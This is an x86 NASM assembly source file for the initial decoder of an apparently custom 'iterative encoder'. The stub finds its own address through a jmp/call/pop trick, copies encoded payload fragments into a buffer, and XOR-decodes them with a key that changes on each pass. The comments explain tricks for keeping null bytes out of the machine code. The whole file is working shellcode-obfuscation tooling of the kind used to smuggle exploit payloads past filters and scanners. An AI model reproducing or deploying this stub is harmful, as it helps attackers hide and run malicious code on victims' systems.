; Iterative Encoder initial decoder

BITS 32

%define INIT_KEY 0x11223344  ; value to find it in the hex
%define BUFF_LEN 0xBB        ; value to find it in the hex
;%define KEY_OFFSET           ; distance from edi where INIT_KEY is, so it can be written over

mov  ebx,INIT_KEY
push ebx
xor  edx,edx          ; 1st iteration count is 0
push edx


reentrance_point:     ; this is where all fragments jmp to when done $reentrace_offset
pop  edx              ; edx will hold the iteration count
pop  ebx              ; ebx will hold the key

jmp  short call_back  ; getPC
go_for_it:
pop  edi              ; edi holds the address of the buffer

; destroy original key
;xor ecx,ecx
;mov [edi-KEY_OFFSET],ecx

; if edx == 0, then skip the copy
xor ecx,ecx
cmp edx,ecx
je short decode_buff

; copy frag to buff
xor  ecx,ecx                 ; avoid mov ecx,BUFF_LEN to eliminate 0x00s
mov  cl,BUFF_LEN             ; how many words to decode
push ebx                     ; store key to free up register
push edx                     ; store iteration count to free up register
mov  esi,edx                 ; esi will eventually equal base of src fragment. esi = iteration
imul esi,ecx                 ; offset of src frag in words = iteration * buff_len [i=0->o=0;i=1->o=12]
shl  esi,0x2                 ; offset of src frag in bytes = offset in words * 4 [i=0->o->0;i=1->o=48]
add  esi,edi                 ; addr of src frag = offset + address of dst
copy_loop:
   mov  ebx,ecx              ; ebx = ecx (turn words into bytes)
   sub  bl,0x1               ; ebx = ecx-1
   shl  ebx,0x2              ; ebx = (ecx-1)*4 [non-0x00 version of imul ebx,0x4]
   mov  dword edx,[esi+ebx]  ; tmp var edx = addr of src frag base + ecx's offset
   mov  dword [edi+ebx],edx  ; word[buff_len-(i*4)] = tmp var edx
loop copy_loop               ; ecx--; if (ecx > 0) { loop } else { break }
pop  edx                     ; edx holds the iteration count again
pop  ebx                     ; ebx holds the key again


decode_buff:
xor  ecx,ecx
mov  cl,BUFF_LEN                   ; how many words to decode
decode_loop:
   xor  dword [edi+(ecx-1)*4],ebx   ; starting from end, xor each word with ebx (the key)
loop decode_loop                   ; ecx--; if (ecx > 0) { loop } else { break }

; prep for next call
add  ebx,[edi]    ; modify the key with the base offset's plain text value
push ebx          ; push the key for next time
inc  edx          ; iteration_count++
push edx          ; push the iteration count for next time
jmp short the_awesome   ; skip over the getPC's call

call_back:
call go_for_it 

the_awesome:      ; buffer
;jmp decoder_stub  ; place holder thathelps determine NEG_DIST_TO_decoder_stub
; alternatively all frags could jmp to this jmp, but then jmp the_awesome would nee to jmp the_awesome2
;the_awesome2:
nop               ; place holder to make getting total length easy, remove this byte from $decoder

; this is a constant sized body of code that clears any pushes
; it ends with a jmp back to "decoder_stub" that is shared by all fragments that exist in it
; [[init][decoder]][frag0][jmp to decoder][fragN]
